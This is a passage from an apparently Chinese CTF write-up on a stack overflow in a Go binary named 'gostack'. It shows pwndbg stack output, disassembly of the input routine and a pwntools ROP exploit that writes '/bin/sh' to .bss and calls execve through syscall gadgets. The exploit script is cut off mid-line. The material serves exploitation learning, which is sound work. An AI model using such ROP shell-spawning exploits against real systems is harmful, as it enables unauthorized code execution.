umber&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;type&#34;&gt;x18&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;a:&lt;span class=&#34;number&#34;&gt;0150&lt;/span&gt;│&lt;span class=&#34;literal&#34;&gt;-0b0&lt;/span&gt;   &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;xc000049eb0 —▸ &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;x549e80 (data_start+&lt;span class=&#34;number&#34;&gt;3296&lt;/span&gt;) —▸ &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;xc000100000 —▸ &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;x4b9640 ◂— &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;x8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;b:&lt;span class=&#34;number&#34;&gt;0158&lt;/span&gt;│&lt;span class=&#34;literal&#34;&gt;-0a8&lt;/span&gt;   &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;xc000049eb8 —▸ &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;x4aa800 ◂— &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;x10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;c:&lt;span class=&#34;number&#34;&gt;0160&lt;/span&gt;│&lt;span class=&#34;literal&#34;&gt;-0a0&lt;/span&gt;   &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;xc000049ec0 —▸ &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;x4df040 —▸ &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;x4c15af ◂— &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;x6f79207475706e49 (&lt;span class=&#34;string&#34;&gt;&amp;#x27;Input yo&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;d:&lt;span class=&#34;number&#34;&gt;0168&lt;/span&gt;│&lt;span class=&#34;literal&#34;&gt;-098&lt;/span&gt;   &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;xc000049ec8 —▸ &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;xc000049d98 ◂— &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;x61616161616161 /* &lt;span class=&#34;string&#34;&gt;&amp;#x27;aaaaaaa&amp;#x27;&lt;/span&gt; */&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;e:&lt;span class=&#34;number&#34;&gt;0170&lt;/span&gt;│&lt;span class=&#34;literal&#34;&gt;-090&lt;/span&gt;   &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;xc000049ed0 ◂— &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;x100&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;f:&lt;span class=&#34;number&#34;&gt;0178&lt;/span&gt;│&lt;span class=&#34;literal&#34;&gt;-088&lt;/span&gt;   &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;xc000049ed8 ◂— &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;x100&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;30&lt;/span&gt;:&lt;span class=&#34;number&#34;&gt;0180&lt;/span&gt;│&lt;span class=&#34;literal&#34;&gt;-080&lt;/span&gt;   &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;xc000049ee0 —▸ &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;x4df4e8 —▸ &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;x4aeb40 ◂— &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;x10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;31&lt;/span&gt;:&lt;span class=&#34;number&#34;&gt;0188&lt;/span&gt;│&lt;span class=&#34;literal&#34;&gt;-078&lt;/span&gt;   &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;xc000049ee8 —▸ &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;xc000010010 —▸ &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;xc00007e000 ◂— &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;x0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;32&lt;/span&gt;:&lt;span class=&#34;number&#34;&gt;0190&lt;/span&gt;│&lt;span class=&#34;literal&#34;&gt;-070&lt;/span&gt;   &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;xc000049ef0 —▸ &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;x4c5dd0 —▸ &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;x49b080 ◂— cmp rsp, qword ptr [&lt;span class=&#34;type&#34;&gt;r14&lt;/span&gt; + &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;type&#34;&gt;x10&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;33&lt;/span&gt;:&lt;span class=&#34;number&#34;&gt;0198&lt;/span&gt;│&lt;span class=&#34;literal&#34;&gt;-068&lt;/span&gt;   &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;xc000049ef8 ◂— &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;x10000&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;34&lt;/span&gt;:&lt;span class=&#34;number&#34;&gt;01&lt;/span&gt;a0│&lt;span class=&#34;literal&#34;&gt;-060&lt;/span&gt;   &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;xc000049f00 —▸ &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;xc000102000 ◂— &lt;span class=&#34;string&#34;&gt;&amp;#x27;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\n&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;35&lt;/span&gt;:&lt;span class=&#34;number&#34;&gt;01&lt;/span&gt;a8│&lt;span class=&#34;literal&#34;&gt;-058&lt;/span&gt;   &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;xc000049f08 ◂— &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;x24 /* &lt;span class=&#34;string&#34;&gt;&amp;#x27;$&amp;#x27;&lt;/span&gt; */&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;36&lt;/span&gt;:&lt;span class=&#34;number&#34;&gt;01&lt;/span&gt;b0│&lt;span class=&#34;literal&#34;&gt;-050&lt;/span&gt;   &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;xc000049f10 ◂— &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;x1000&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;37&lt;/span&gt;:&lt;span class=&#34;number&#34;&gt;01&lt;/span&gt;b8│&lt;span class=&#34;literal&#34;&gt;-048&lt;/span&gt;   &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;xc000049f18 —▸ &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;xc000102000 ◂— &lt;span class=&#34;string&#34;&gt;&amp;#x27;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\n&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;38&lt;/span&gt;:&lt;span class=&#34;number&#34;&gt;01&lt;/span&gt;c0│&lt;span class=&#34;literal&#34;&gt;-040&lt;/span&gt;   &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;xc000049f20 ◂— &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;x1000&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;39&lt;/span&gt;:&lt;span class=&#34;number&#34;&gt;01&lt;/span&gt;c8│&lt;span class=&#34;literal&#34;&gt;-038&lt;/span&gt;   &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;xc000049f28 ◂— &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;x1000&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;a:&lt;span class=&#34;number&#34;&gt;01&lt;/span&gt;d0│&lt;span class=&#34;literal&#34;&gt;-030&lt;/span&gt;   &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;xc000049f30 ◂— &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;x25 /* &lt;span class=&#34;string&#34;&gt;&amp;#x27;%&amp;#x27;&lt;/span&gt; */&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;b:&lt;span class=&#34;number&#34;&gt;01&lt;/span&gt;d8│&lt;span class=&#34;literal&#34;&gt;-028&lt;/span&gt;   &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;xc000049f38 ◂— &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;x25 /* &lt;span class=&#34;string&#34;&gt;&amp;#x27;%&amp;#x27;&lt;/span&gt; */&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;c:&lt;span class=&#34;number&#34;&gt;01&lt;/span&gt;e0│&lt;span class=&#34;literal&#34;&gt;-020&lt;/span&gt;   &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;xc000049f40 ◂— &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;x0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;... ↓          &lt;span class=&#34;number&#34;&gt;2&lt;/span&gt; skipped&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;f:&lt;span class=&#34;number&#34;&gt;01&lt;/span&gt;f8│&lt;span class=&#34;literal&#34;&gt;-008&lt;/span&gt;   &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;xc000049f58 ◂— &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;x1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;40&lt;/span&gt;:&lt;span class=&#34;number&#34;&gt;0200&lt;/span&gt;│ &lt;span class=&#34;built_in&#34;&gt;rbp&lt;/span&gt;   &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;xc000049f60 —▸ &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;xc000049f70 —▸ &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;xc000049fd0 ◂— &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;x0&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;能清晰地看到，rbp 与缓冲区的大小：&lt;/p&gt;
&lt;figure class=&#34;highlight powershell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;pwndbg&amp;gt; distance &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;xf60 &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;xd98&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;xf60-&amp;gt;&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;xd98 is &lt;span class=&#34;literal&#34;&gt;-0x1c8&lt;/span&gt; bytes (&lt;span class=&#34;literal&#34;&gt;-0x39&lt;/span&gt; words)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;那么，之后就可以直接进行栈溢出了。但是，在经过多次溢出之后，发现了个致命的问题，就是关于这个输入函数，致命在哪里呢？在这儿：&lt;/p&gt;
&lt;figure class=&#34;highlight powershell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;.text:&lt;span class=&#34;number&#34;&gt;000000000049&lt;/span&gt;A786                 cmp     byte ptr [&lt;span class=&#34;type&#34;&gt;rax&lt;/span&gt;+&lt;span class=&#34;number&#34;&gt;79&lt;/span&gt;&lt;span class=&#34;type&#34;&gt;h&lt;/span&gt;], &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.text:&lt;span class=&#34;number&#34;&gt;000000000049&lt;/span&gt;A78A                 jnz     short loc_49A79A&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;以及：&lt;/p&gt;
&lt;figure class=&#34;highlight powershell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;.text:&lt;span class=&#34;number&#34;&gt;000000000049&lt;/span&gt;A79A loc_49A79A:                             ; CODE XREF: bufio__ptr_Scanner_Scan+&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;A↑j&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.text:&lt;span class=&#34;number&#34;&gt;000000000049&lt;/span&gt;A79A                 xor     eax, eax&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.text:&lt;span class=&#34;number&#34;&gt;000000000049&lt;/span&gt;A79C                 mov     &lt;span class=&#34;built_in&#34;&gt;rbp&lt;/span&gt;, [&lt;span class=&#34;type&#34;&gt;rsp&lt;/span&gt;+&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;type&#34;&gt;D0h&lt;/span&gt;+&lt;span class=&#34;type&#34;&gt;var_8&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.text:&lt;span class=&#34;number&#34;&gt;000000000049&lt;/span&gt;A7A4                 add     rsp, &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;D0&lt;span class=&#34;built_in&#34;&gt;h&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.text:&lt;span class=&#34;number&#34;&gt;000000000049&lt;/span&gt;A7AB                 retn&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;它会对这儿进行一次比对，如果是 0，则不会跳转，如果不是 0，则会跳转，直接停止输入的函数。&lt;br&gt;
所以需要直接用 \x00 来填充是最保险的。之后就是 syscall 来打，但是 exp 我不是很会写，先借鉴借鉴大佬们的，之后再看看：&lt;/p&gt;
&lt;figure class=&#34;highlight powershell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;52&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;53&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;54&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;55&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;56&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;57&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;58&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;59&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;60&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;61&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;62&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;63&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;64&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;65&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;66&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;67&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;68&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;from pwn import *&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# context.log_level = &amp;#x27;debug&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;io = &lt;span class=&#34;keyword&#34;&gt;process&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;./gostack&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# io = remote(&amp;#x27;8.147.133.63&amp;#x27;,  34196)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;io.recvuntil(b&lt;span class=&#34;string&#34;&gt;&amp;#x27;magic message :&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;bss = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;x000000000563C50&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;syscall_addr = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;x0000000000404043&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pop_rsi = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;x000000000042138a&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pop_rax = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;x000000000040f984&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pop_rdx = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;x00000000004944ec&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pop_rdi = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;x00000000004a18a5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;leave_ret = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;x000000000049695a&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# write &amp;#x27;/bin/sh\x00&amp;#x27; to bss&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;rop = p64(pop_rax)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;rop += p64(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;rop += p64(pop_rsi)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;rop += p64(bss)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;rop += p64(pop_rdx)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;rop += p64(&lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;rop += p64(pop_rdi)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;rop += p64(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;) &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;rop += p64(syscall_addr)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;rop += p64(syscall_addr)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;rop += p64(syscall_addr)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;rop += p64(syscall_addr)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;rop += p64(syscall_addr)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;rop += p64(syscall_addr)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# execve(&amp;#x27;/bin/sh&amp;#x27;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;rop += p64(pop_rax)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;rop += p64(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;x3b)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;rop += p64(pop_rsi)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;rop += p64(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;rop += p64(pop_rdx)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;rop += p64(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;rop += p64(pop_rdi)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;rop += p64(bss)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;rop += p64(syscall_addr)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;rop += p64(syscall_addr)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;rop += p64(syscall_addr)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;rop += p64(syscall_addr)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;rop += p64(syscall_addr)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;rop += p64(syscall_addr)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;payload = b&lt;span class=&#34;string&#34;&gt;&amp;#x27;/bin/sh\x00&amp;#x27;&lt;/span&gt; + b&lt;span class=&#34;string&#34;&gt;&amp;#x27;A&amp;#x27;&lt;/span&gt; * &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;xf8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;payload += p64(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;xc00004dd98)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;payload += p64(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;x110)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;payload += p64(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;x110)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;payload += b&lt;span class=&#34;string&#34;&gt;&amp;#x27;D&amp;#x27;&lt;/span&gt; * &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;x60 + b&lt;span 